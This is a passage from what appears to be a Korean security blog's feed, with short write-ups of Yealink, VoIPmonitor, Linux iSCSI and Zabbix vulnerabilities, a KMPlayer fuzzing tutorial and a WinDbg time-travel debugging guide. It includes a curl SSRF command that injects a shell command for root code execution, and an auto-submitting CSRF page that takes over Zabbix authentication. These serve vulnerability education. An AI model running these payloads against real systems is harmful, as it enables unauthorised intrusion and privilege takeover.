req.query.pos;<span class="hljs-number">224</span>         <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`url===<span class="hljs-subst">$&#123;url&#125;</span>`</span>);<span class="hljs-number">225</span>         <span class="hljs-keyword">let</span> headers = &#123;<span class="hljs-number">226</span>             <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,<span class="hljs-number">227</span>             <span class="hljs-string">&#x27;User-Agent&#x27;</span>: req.headers[<span class="hljs-string">&#x27;user-agent&#x27;</span>],<span class="hljs-number">228</span>             <span class="hljs-string">&#x27;x-forwarded-for&#x27;</span>: commom.getClientIP(req),<span class="hljs-number">229</span>             token: req.session.token<span class="hljs-number">230</span>         &#125;;<span class="hljs-number">231</span>         request.get(&#123;<span class="hljs-number">232</span>             url: url,<span class="hljs-number">233</span>             headers: headers,<span class="hljs-number">234</span>             timeout: <span class="hljs-number">60000</span>,<span class="hljs-number">235</span>             qs: &#123;<span class="hljs-number">236</span>                 pos: pos<span class="hljs-number">237</span>             &#125;<span class="hljs-number">238</span>         &#125;).pipe(res);<span class="hljs-number">239</span>     &#125; <span class="hljs-keyword">catch</span> (e) &#123;<span class="hljs-number">240</span>         <span class="hljs-built_in">console</span>.error(e);<span class="hljs-number">241</span>         res.send(<span class="hljs-number">242</span>             errcode.MakeResult(<span class="hljs-number">243</span>                 errcode.ERR,<span class="hljs-number">244</span>                 e,<span class="hljs-number">245</span>                 errcode.INTERNAL_ERROR,<span class="hljs-number">246</span>                 <span class="hljs-string">&#x27;server.common.internal.error&#x27;</span><span class="hljs-number">247</span>             )<span class="hljs-number">248</span>         );<span class="hljs-number">249</span>     &#125;<span class="hljs-number">250</span> &#125;);</code></pre><p>17번 줄에서 추가적인 API 사용을 위해 <code>/premise</code> route를 정의합니다. 그 후 217번 줄에서 <code>/premise/front/getPingData</code>를 GET 메소드의 route로 정의합니다. 232번 줄에서 특정 헤더를 사용하여 URL을 GET 메소드로 전송할 수 있습니다. 헤더는 225줄에서 정의되어 있으므로 해당 헤더 값으로 URL을 전송하면 해커가 제어하는 URL을 전송할 수 있습니다.</p><p>해당 취약점을 통해 <code>0.0.0.0:9600/tcp</code>에서 root로 실행되는 <code>smserver</code> 데몬에 요청을 보냅니다. <code>smserver</code>의 <code>mod_firewall.so</code> 모듈에는 Command injection을 할 수 있는 <code>fw_restful_service_get()</code> 함수가 존재합니다. 해당 함수는 <code>zone=</code>에 들어온 GET 변수를 사용하여 명령을 실행합니다.</p><p>따라서 SSRF를 통해 <code>smserver</code>에 payload를 작성하여 보내면 root 권한으로 Remote  Code Execution이 가능합니다.</p><pre><code class="hljs asciidoc">curl --insecure &quot;<span class="hljs-link">https://</span>[<span class="hljs-string">target</span>]/premise/front/getPingData?url=http://0.0.0.0:9600/sm/api/v1/firewall/zone/services?zone=;/usr/bin/id;&quot;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>idioth</tag>
      
      <tag>pre-auth</tag>
      
      <tag>yealink</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 버그헌팅 튜토리얼 Part 2</title>
    <link href="/2021/03/17/l0ch/bughunting-tutorials-part2/"/>
    <url>/2021/03/17/l0ch/bughunting-tutorials-part2/</url>
    
    <content type="html"><![CDATA[<p><a href="https://hackyboiz.github.io/2021/03/07/l0ch/bughunting-tutorial/">버그헌팅 튜토리얼 Part 1</a></p><p>지난 Part 1에 이어 타깃 프로그램 선정과 취약점이 발생한 파일 포맷을 분석해보도록 하겠습니다!</p><h1 id="버그바운티-KMPlayer"><a href="#버그바운티-KMPlayer" class="headerlink" title="버그바운티 - KMPlayer"></a>버그바운티 - KMPlayer</h1><p>제가 예시로 들 프로그램은 KMPlayer입니다. 다들 KMPlayer 아시죠?? 쓰시는 분들도 있을 거고</p><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image0.jpg"></p><blockquote><p>출처 : 네이버 소프트웨어 자료실</p></blockquote><p>KMPlayer의 경우 원래는 동영상 플레이어이지만 음악도 플레이해주고 사진도 볼 수 있습니다. 제가 찾았던 취약점은 사진 포맷 중 하나인 .dib 포맷에서 발생한 힙 오버플로우 취약점입니다. 올해(2017년) 4 월인가 제보하고 7 월에 패치가 되었네요.</p><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image1.png"></p><p>이 취약점으로 설명을 하는 이유는 다음과 같습니다.</p><ol><li>dib 포맷은 압축하지 않고 그냥 비트맵 정보를 raw 하게 저장할 수 있기 때문에 분석을 할 때나 익스를 할 때나 아주 편합니다. 따라서 입문자분들이 처음 공부를 할 때 매우 쉽게 접근할 수 있다고 생각했습니다.</li><li>분석할 코드 커버리지가 작고 취약점이 단순합니다. 그리고 뮤테이트 해야 할 바이트도 적고요. 말 그대로 쉬워서??</li><li>KMPlayer는 예전 버전을 다운 받을 수 있습니다. 다른 건 취약점을 찾아도 환경 구성이 안되면 이런 글을 쓸 수가 없어요 ㅠㅠ </li></ol><p>그래서 이제 시작해보죠 ㅋㅋㅋ 일단 먼저 취약점이 존재하는 버전을 다운 받아 보죠.</p><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image2.png"></p><p>제가 익스플로잇을 진행했던 버전은 4.1.5.8입니다. 사실 4.2.1.4 이전 버전 아무거나 다운 받으셔도 되는 데 제가 찾아 놓은 가젯이나 정보들이 다 저 버전이어서 익스 다시 짜기 귀찮기 때문에 그냥 이 버전으로 진행하겠습니다 ㅋㅋㅋ</p><p>그리고 이제 시드 파일을 만들 건데 만든 파일을 뜯어보면서 dib 파일 포맷에 대해서 간단히 알아보도록 할게요. </p><p>앞서 말했다시피 dib 포맷은 무압축 비트맵 이미지 포맷입니다. 구조가 매우 간단하고 비트맵 정보들이 어떠한 가공도 되지 않고 바로 저장되어 있죠. (압축하는 것도 있기는 해요 하지만 그냥 넘어갈게여) </p><p>포맷은 두 개의 구조체와 비트맵 정보로 이루어져 있습니다. 일단 파일을 만들어볼게요. 개꿀인 게 윈도우에 기본으로 있는 그림판을 사용해서 dib 파일을 만들 수 있습니다.</p><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image3.png"></p><p>여기에서는 24 비트 비트맵의 dib 포맷을 사용할 겁니다. 24 비트인 이유는 RGB를 표현하기 위해서 한 픽셀을 표현하는 데 3 바이트를 사용하기 때문입니다.</p><p>이렇게 먼저 저장을 하고 아무 색이나 넣어볼게요. 그런 다음 저장하고 hxd로 봅니다. 저는 그냥 회색으로 칠해보았는 데 헥스로 보니까 아래처럼 나오네요.</p><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image4.jpg"></p><p>음 딱 봐도 위에 빨간 부분이 헤더 정보이고 뒤에서 비트맵 정보인 거 같죠?? 이렇게<br>간단한 포맷 처음 보는 거 같죠?? ㅇㅈ? ㅇㅇㅈ</p><p>그럼 이제 빨간색 박스 부분의 정보가 뭔지 간단하게만 알아볼게요. 참고로 다른 포맷으로 진행할 때에도 포맷을 알고 리버싱을 진행하는 게 좀 더 편합니다. 특히 리버싱을 진행할 때에는 해당 부분이 어떤 역할을 하는 지 그래서 우리가 익스플로잇에 어떻게 활용을 할 수 있는지 알 수 있죠. 확실히 리버싱 속도를 향상시켜 주기는 합니다.</p><p>일단 첫 번째 구조체를 보면</p><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image5.png"></p><p>이렇게 되어 있습니다.</p><p>첫 번째는 당연히 헤더가 들어가 있고 뒤에 파일의 전체 사이즈 그리고 마지막은 비트맵 정보가 시작되는 오프셋을 저장하고 있습니다.</p><p>그리고 두 번째 오프셋을 볼게여</p><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image6.png"></p><p>이미지의 가로 세로 길이, 해상도, 압축 여부 등등이 저장되어 있습니다. 이 구조체는 좀 더 많네요? 위 구조체는 저장하는 데만 쓰이고 실제 출력할 때에는 아래 구조체의 정보를 사용한다고 합니다. 하지만 딱히 익스에는 도움이 안 되니 그냥 이정도만 알고 필요한 거는 뒤에서 진행하면서 알아보도록 할게요. 더 알고 싶은 분은 아래 링크를 참고하시면 될 거 같습니다.</p><p><a href="http://www.soulfree.net/186">http://www.soulfree.net/186</a></p><p>이제 헤더 정보들도 알았고 퍼저에 돌려볼 건데 퍼저를 돌리기 전에 분석을 좀 더 편하게 하기 위해서 저만의 데이터를 넣을 겁니다.</p><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image7.jpg"></p><p>비트맵 정보가 들어있는 부분의 앞부분을 제 닉네임으로 바꾸었는데요. 이렇게 하면 나중에 크래시 분석을 할 때 내 파일이 어디에 로드되었는지 확인하기 편합니다. 따라서 다른 메모리에는 없을 법한 문자열로 채워주는 게 좋죠. AAAA 나 BBBB 이런 거는 단순해서 다른 쓰레기 데이터에도 존재하기 때문에 저는 제 닉네임을 주로 사용하는 편입니다. 추가적으로 파일 맨 뒤에도 비슷하게 넣어주면 끝까지 다 로드되었는 지도 알 수 있겠죠? 이렇게 시드 파일을 만들고 퍼저를 돌리면 됩니다. </p><p>두 파트에 거쳐 워밍업이 마무리 됐네요..! 네 이제 시작이라는 뜻입니다 ㅋㅋㅋㅋㅋㅋㅋㅋ</p><p>다음 글에서는 본격적으로 퍼저의 크래시 정보를 통해 취약점을 분석하고 익스플로잇을 해볼 건데요. 본격적인 삽질에 주의해주시기 바랍니다 ㅎㅎ 그럼 Part 3로 돌아오겠습니다!</p><h2 id="Part-3-예고"><a href="#Part-3-예고" class="headerlink" title="Part 3 예고"></a>Part 3 예고</h2><p><img src="/2021/03/17/l0ch/bughunting-tutorials-part2/image8.png"></p><blockquote><p>고생은 이제부터 시작..</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>bug hunting</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄]VoIPmonitor BoF to RCE</title>
    <link href="/2021/03/17/fabu1ous/2021-03-17/"/>
    <url>/2021/03/17/fabu1ous/2021-03-17/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://github.com/EnableSecurity/advisories/tree/master/ES2021-03-voipmonitor-livesniffer-buffer-overflow">VoIPmonitor is vulnerable to a buffer overflow when using the live sniffer</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>VoIPmonitor 27.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>오픈소스 network packet sniffer인 VoIPmonitor에서 RCE취약점이 발견되었습니다. </p><pre><code class="hljs c"><span class="hljs-keyword">char</span> callidstr[<span class="hljs-number">1024</span>] = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">if</span>(packetS-&gt;sipDataLen) &#123;    <span class="hljs-keyword">void</span> *memptr = memmem(packetS-&gt;data_()+ packetS-&gt;sipDataOffset,         packetS-&gt;sipDataLen, <span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-number">2</span>);    <span class="hljs-keyword">if</span>(memptr) &#123;        <span class="hljs-built_in">memcpy</span>(description, packetS-&gt;data_()+ packetS-&gt;sipDataOffset,             (<span class="hljs-keyword">char</span> *)memptr - (<span class="hljs-keyword">char</span>*)(packetS-&gt;data_()+ packetS-&gt;sipDataOffset));        description[(<span class="hljs-keyword">char</span>*)memptr - (<span class="hljs-keyword">char</span>*)(packetS-&gt;data_()+             packetS-&gt;sipDataOffset)] = <span class="hljs-string">&#x27;\0&#x27;</span>;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, description);    &#125;    <span class="hljs-comment">// ...</span>&#125;</code></pre><p>위는 함수 <code>save_packet_sqp</code>의 코드입니다. 변수 <code>description</code>은 1024 bytes 크기로 고정되어 있는 SIP request 값을 저장하는 배열입니다. <code>description</code>의 크기보다 큰 request를 보내 버퍼오버플로우가 가능합니다. Stack canary, RELRO 등 표준 memory corruption 보호 기법이 없으므로 버퍼오버플로우를 통한 원격코드 실행이 가능합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>bof</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-27365: Linux 커널에서 발견된 15년간 존재한 권한상승 취약점</title>
    <link href="/2021/03/16/l0ch/2021-03-16/"/>
    <url>/2021/03/16/l0ch/2021-03-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://movaxbx.ru/2021/03/13/new-old-bugs-in-the-linux-kernel/?utm_source=rss&utm_medium=rss&utm_campaign=new-old-bugs-in-the-linux-kernel">New Old Bugs in the Linux Kernel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Linux 배포판(RHEL 8.1, 8.2 및 8.3에서 테스트됨)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Linux 커널의 하위 시스템인 <a href="https://ko.wikipedia.org/wiki/SCSI">SCSI (Small Computer System Interface)</a>이 포함된 배포판에서 heap buffer overflow을 통한 권한 상승 취약점이 발견되었습니다. 해당 취약점은 15년간 존재했던 것으로 알려졌습니다.</p><p>취약점은 <code>iscsi_session_get_param</code> 함수에 존재합니다. 유저는 호스트 이름, 유저 이름과 같은 iSCSI 연결과 관련된 속성을 설정하는 iSCSI 하위 시스템에 netlink 메시지를 보낼 수 있습니다. netlink 메시지의 최대 길이는 시스템에 따라 <code>2^32</code> 또는 <code>2^16</code> 크기입니다.</p><pre><code class="hljs c"><span class="hljs-keyword">switch</span>(param) &#123;...<span class="hljs-keyword">case</span> ISCSI_PARAM_USERNAME:len = <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;%s\\n&quot;</span>, session-&gt;username);<span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> ISCSI_PARAM_USERNAME_IN:len = <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;%s\\n&quot;</span>, session-&gt;username_in);<span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> ISCSI_PARAM_PASSWORD:len = <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;%s\\n&quot;</span>, session-&gt;password);<span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> ISCSI_PARAM_PASSWORD_IN:len = <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;%s\\n&quot;</span>, session-&gt;password_in);<span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> ISCSI_PARAM_IFACE_NAME:len = <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;%s\\n&quot;</span>, session-&gt;ifacename);<span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> ISCSI_PARAM_INITIATOR_NAME:len = <span class="hljs-built_in">sprintf</span>(buf, <span class="hljs-string">&quot;%s\\n&quot;</span>, session-&gt;initiatorname);<span class="hljs-keyword">break</span>;...</code></pre><p>메시지의 각 속성은 <code>sprintf</code> 함수로 처리되고 할당되는 버퍼 크기는 커널의 <code>PAGE_SIZE</code>로 설정되며 크기에 대한 검사가 없습니다. 따라서 속성을 <code>PAGE_SIZE</code>보다 많이 입력하면 buffer overflow를 트리거할 수 있습니다.</p><p>현재까지 확인된 취약한 배포판은 <code>libiscsi</code> 커널 모듈을 자동 로드하는 CentOS 및 RHEL 버전 8.1, 8.2, 8.3이며 다른 배포판 또한 해당 모듈이 로드되어 있으면 공격 조건을 만족합니다. 그 외 CVE-2021-27363(커널 포인터 유출 취약점), CVE-2021-27364(커널 OOB read 취약점) 또한 동일한 SCSI 라이브러리에서 발견되었습니다.</p><p>취약점의 패치 히스토리는 <a href="https://github.com/torvalds/linux/commit/ec98ea7070e94cc25a422ec97d1421e28d97b7ee#diff-156a34b787dc5569ae3b78903bbda80af9e2264786c6cb8efb16c7ee32bd4bca">torvalds/linux</a> 에서 확인할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>heap bof</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
      <tag>heap buffer overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-27927: Zabbix에서 발견된 CSRF를 통한 RCE</title>
    <link href="/2021/03/15/idioth/2021-03-15/"/>
    <url>/2021/03/15/idioth/2021-03-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://movaxbx.ru/2021/03/12/cve-2021-27927-csrf-to-rce-chain-in-zabbix/?utm_source=rss&utm_medium=rss&utm_campaign=cve-2021-27927-csrf-to-rce-chain-in-zabbix">CVE-2021-27927: CSRF to RCE Chain in Zabbix</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Zabbix version &lt; 4.0.28rc1, 5.0.8rc1, 5.2.4rc1, 5.4.0alpha1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>기업용 IT 네트워크, 애플리케이션 모니터링 솔루션 Zabbix에서 CSRF 취약점이 발견되었습니다. 취약점은 Zabbix UI의 인증 부분에 존재하며, CSRF를 통해 인증되지 않은 사용자가 Zabbix 관리자가 악성 링크를 접속하도록 유도하여 관리자 권한을 획득할 수 있습니다. 취약점은 <a href="https://www.hahwul.com/2020/01/18/samesite-lax/"><code>SameSite=Lax</code> 쿠키 보호</a>가 적용된 경우에도 모든 브라우저에서 악용될 수 있습니다.</p><p>Zabbix는 request body의 <code>sid</code> 파라미터에 anti-CSRF 토큰을 사용하여 CSRF 공격을 방지합니다. 하지만 애플리케이션의 인증 설정 업데이트 부분에서 anti-CSRF 토큰을 사용하지 않습니다. 또한 Zabbix는 POST request의 모든 파라미터를 GET을 통해 URL 쿼리 파라미터로 전달할 수 있습니다. 따라서 인증 설정 업데이트 부분에서 GET request를 전송하면, <code>sid</code> 파라미터가 없어도 처리됩니다.</p><p>취약점을 트리거하는 순서는 다음과 같습니다.</p><ol><li><p>타깃 Zabbix 애플리케이션에 접근할 수 있는 LDAP 서버를 설정합니다.</p></li><li><p>악성 HTML 페이지를 삽입한 웹 사이트를 호스팅 합니다. 아래는 exploit 코드의 예제입니다.</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Any web site<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;link&#x27;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;http://192.168.0.140/zabbix.php?form_refresh=1&amp;action=authentication.update&amp;db_authentication_type=0&amp;authentication_type=1&amp;http_auth_enabled=0&amp;ldap_configured=1&amp;ldap_host=10.0.229.1&amp;ldap_port=389&amp;ldap_base_dn=dc%3Dsmoke%2Cdc%3Dnet&amp;ldap_search_attribute=sAMAccountName&amp;ldap_bind_dn=cn%3DAdmin%2CCN%3DUsers%2CDC%3Dsmoke%2CDC%3Dnet&amp;ldap_case_sensitive=1&amp;action_passw_change=authentication.edit&amp;ldap_test_user=Admin&amp;ldap_test_password=Z@bb1x!&amp;saml_auth_enabled=0&amp;update=Update&#x27;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;link&#x27;</span>).click();</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></li><li><p>Zabbix 관리자가 해당 링크에 접속하면, 인증 설정이 자동으로 업데이트됩니다.</p></li><li><p>해커의 자격 증명을 통해 관리자로 로그인할 수 있습니다.</p></li></ol><p>해커는 Zabbix에서 인증 설정이 업데이트되면 자격 증명의 유효성 검사를 통해 LDAP 서버에서 CSRF 공격이 성공했는지 확인할 수 있습니다. 또한 관리자로 접근할 시 Zabbix에 내장된 기능을 통해 Zabbix 서버, Zabbix 서버 프록시, Zabbix agent에서 command execution이 가능합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>idioth</tag>
      
      <tag>csrf</tag>
      
      <tag>zabbix</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 시간을 여행하는 해커를 위한 안내서 Part3</title>
    <link href="/2021/03/14/fabu1ous/ttd-3/"/>
    <url>/2021/03/14/fabu1ous/ttd-3/</url>
    
    <content type="html"><![CDATA[<h1 id="Part-III"><a href="#Part-III" class="headerlink" title="Part III"></a>Part III</h1><p><img src="/2021/03/14/fabu1ous/ttd-3/1.png"></p><p>벌써 Part 3입니다. 3주마다 시리즈 글 하나씩 블로그에 올리고 있는데 3주가 왜 이렇게 빨리 지나갈까요. 아마 개강도 하고 바빠지니 시간이 참 빠르게 흘러가는 것처럼 느껴지나 봅니다. 이번 Part 3에서는 <code>dx</code> 명령어와 TTD data object의 사용법을 정리해봤습니다. Part 2를 읽으신 분들이라면 이게 무엇을 뜻하는지 아시겠죠? 네, 이번에도 버그 바운티를 <s>안 했습니다</s> 못했습니다. Apex Legends 꿀잼 ㅎㅎ;; 사실 버그 바운티를 하긴 했는데 막상 “TTD를 사용한 버그 바운티 꿀팁!”이라는 주제로 하나의 글을 쓰기엔 엄청 애매하더라고요. 이미 이전 파트들에서 작성한 내용들이 대부분이고 몇몇 상황들은 글로 형용하기엔 저의 글빨이 딸리고…</p><p><img src="/2021/03/14/fabu1ous/ttd-3/both.png"></p><p>그래서 Part 2 마지막에 예고했던 두 가지 글 주제를 Part 3에 몰아 쓰기로 결정했습니다.</p><h2 id="시간을-여행하는-해커를-위한-안내서-이전-글"><a href="#시간을-여행하는-해커를-위한-안내서-이전-글" class="headerlink" title="시간을 여행하는 해커를 위한 안내서 이전 글"></a>시간을 여행하는 해커를 위한 안내서 이전 글</h2><ol><li><a href="https://hackyboiz.github.io/2021/01/24/fabu1ous/ttd-1/">Part1</a></li><li><a href="https://hackyboiz.github.io/2021/02/21/fabu1ous/ttd-2/">Part2</a></li></ol><h1 id="Time-Travel-Debugging-objects"><a href="#Time-Travel-Debugging-objects" class="headerlink" title="Time Travel Debugging objects"></a>Time Travel Debugging objects</h1><p>이번 Part 3에선 TTD data model object와 Trace File로부터 TTD data model object를 Query 하는 방법에 대해 알아볼 겁니다. TTD Trace File 사용 시 자동으로 Process Object와 Session Object에 데이터가 로드되며 <code>dx</code> 명령어를 통해 그 데이터들을 확인할 수 있습니다.</p><h1 id="dx-명령어"><a href="#dx-명령어" class="headerlink" title="dx 명령어"></a>dx 명령어</h1><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx Debugger</code></pre><p><img src="/2021/03/14/fabu1ous/ttd-3/3.png"></p><p><code>dx</code>는 Debugger Object Model Expression을 출력해주는 명령어입니다. 제가 주로 사용하는 기능 위주로(딱 이 글을 읽는데 필요한 것들만) 설명하겠습니다. 따라서 <code>dx</code> 명령어에 대해 추가로 더 알아보고 싶으신 분들은 <a href="%5B%5D()">ms docs dx</a>를 읽어보시길 바랍니다.</p><p>우선 <code>dx</code> 명령어의 파라미터를 알아봅시다. 이번 Part 3에서 앞으로 사용할 파라미터들은 <code>-g</code>와 <code>-r#</code>이 있습니다.</p><ul><li><p>-g</p><p>데이터를 그리드로 출력해주는 파라미터입니다. 주로 Heap Object나 Module Object 등을 확인할 때 사용합니다.</p></li><li><p>-r#</p><p>최대 <code>#</code> 레벨까지 하위 필드를 출력해주는 파라미터입니다. 생략하면 <code>-r1</code>이 기본값으로 적용됩니다.</p></li></ul><h2 id="사용-예시"><a href="#사용-예시" class="headerlink" title="사용 예시"></a>사용 예시</h2><ul><li>call stack 출력</li></ul><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dx -r1 Debugger.Sessions.First().Processes.First().Threads.First().Stack.Frames</code></pre><p><img src="/2021/03/14/fabu1ous/ttd-3/4.png"></p><p>dx를 사용해 디버깅 세션의 첫 번째 프로세스의 첫 번째 쓰레드의 call stack을 <code>-r1</code>의 재귀 레벨로 출력한 모습입니다.</p><ul><li>로드된 모듈 리스트 출력</li></ul><pre><code class="hljs c"><span class="hljs-number">0</span>:<span class="hljs-number">000</span> &gt; dx -g @$curprocess.Modules</code></pre><p><img src="/2021/03/14/fabu1ous/ttd-3/5.png"></p><p>Trace 전체에서 로드하는 Module들을 grid 형식으로 출력한 모습입니다.</p><h1 id="Process-Object"><a href="#Process-Object" class="headerlink" title="Process Object"></a>Process Object</h1><p><img src="/2021/03/14/fabu1ous/ttd-3/6.png"></p><p>dx 명령어에 대해 알아봤으니 이제 본격 적으로 TTD data model object에 대해 알아봅시다. 글 초반 부에 언급했듯이 TTD를 사용하면 자동으로 Process object와 Session object에 데이터 모델들이 저장된다고 했었죠? 그중 Process Object입니다.  <code>@$curprocess.TTD</code> namespace를 이용해 접근할 수 있습니다.</p><ul><li><p>Lifetime</p><p><img src="/2021/03/14/fabu1ous/ttd-3/7.png"></p><p>TTD range object를 사용해 전체 Trace File의 범위를 보여줍니다. MinPosition은 Trace File의 시작 시점에 해당하는 TTD Position을, MaxPosition은 Trace File의 종료 시점에 해당하는 TTD Position을 뜻합니다.</p></li><li><p>Threads</p><p><img src="/2021/03/14/fabu1ous/ttd-3/8.png"></p><p>TTD thread object를 사용해 전체 Trace File의 Lifetime에 존재하는 모든 쓰레드들에 대한 정보가 저장되어 있습니다.</p></li><li><p>Events</p><p><img src="/2021/03/14/fabu1ous/ttd-3/9.png"></p><p>TTD event object들이 저장되어 있습니다. 출력 시 Trace File 전체에서 발생한 여러 이벤트들을 확인할 수 있습니다. 예를 들면 Module의 로드 시점이라던가 Exception 발생 시점이라던가. Part 2에선 이 Event object를 사용해 Exception 위치를 확인하고, 디버깅의 시작 위치를 정하기 위해 사용했었습니다.</p></li></ul><h1 id="Session-Object"><a href="#Session-Object" class="headerlink" title="Session Object"></a>Session Object</h1><p><img src="/2021/03/14/fabu1ous/ttd-3/10.png"></p><p>이번엔 Session Object입니다. <code>@$cursession.TTD</code> namespace를 통해 접근할 수 있습니다.</p><ul><li><p>Data.Heap()</p><p><img src="/2021/03/14/fabu1ous/ttd-3/11.png"></p><p>Trace File 전체에서 할당된 Heap object들이 저장되어 있습니다. <code>Data.Heap()</code> 메소드와 grid 파라미터를 사용해 출력해줄 주소, 사이즈, 할당 시점, 해제 시점을 한눈에 볼 수 있어 되게 편리합니다. 최근에 버그 바운티를 하면서 힙 오버플로우로 의심되는 버그를 분석 중인데 이 <code>Data.Heap()</code> object를 정말 유용하게 사용하고 있습니다.</p></li><li><p>Calls()</p><p><img src="/2021/03/14/fabu1ous/ttd-3/12.png"></p><p>특정 함수의 호출에 대한 여러 정보를 담고 있는 calls object입니다. <code>Calls()</code> 메소드를 통해 호출 횟수, 호출 시점, 리턴 시점, 리턴 값 등의 정보를 볼 수 있습니다. breakpoint의 상위 호환으로 사용이 가능합니다. 어떤 함수에서 버그가 발생하는지 알고 있다면 Calls query를 TimeStart값으로 정렬한 후 맨 마지막 데이터 혹은 crash 발생 시점과 가장 가까운 데이터를 선택해 버그가 발생하는 정확한 시점으로 이동이 가능합니다. 아쉽게도 Calls() 메소드를 사용하려면 해당 함수의 심볼이 살아 있어야 해서 버그 바운티를 할 때 사용하지 못하는 경우도 있습니다.</p></li><li><p>Memory()</p><p><img src="/2021/03/14/fabu1ous/ttd-3/13.png"></p><p>Memory object를 사용해 특정 메모리 주소에 발생한 모든 접근을 확인할 수 있습니다. 특정 메모리 주소에 접근한 시점, 접근 타입, 당시 프로그램 카운터의 상황 등을 함께 저장하고 있습니다. ba 명령어의 상위 호환으로 사용할 수 있어서 Part 2에서 EBP가 덮어 쓰이는 시점을 찾기 위해 ba 명령어 대신 이 Memory object를 사용할까 고민했었습니다. ba의 경우엔 메모리의 range를 최대 8 bytes까지 지정할 수 있지만 TTD Memory object query는 제한이 없습니다.</p></li></ul><h1 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h1><p>TTD data object들의 종류와 그에 맞는 메소드들의 종류를 알아봤습니다. 이제 그 메소드들을 통해 리턴 받은 데이터들을 정렬 및 가공하는 방법을 알아봅시다.</p><h2 id="Sorting-Queries"><a href="#Sorting-Queries" class="headerlink" title="Sorting Queries"></a>Sorting Queries</h2><p>OrderBy() 혹은 OrderByDescending()을 사용해 특정 column을 기준으로 데이터를 정렬할 수 있습니다. 위에서 Calls() 메소드 이야기를 하면서 설명했던 내용인데 crash 시점, 혹은 Trace File의 종료 시점과 가장 가가운 데이터를 선택하기 위해 TimeStart와 OrderByDescending()을 주로 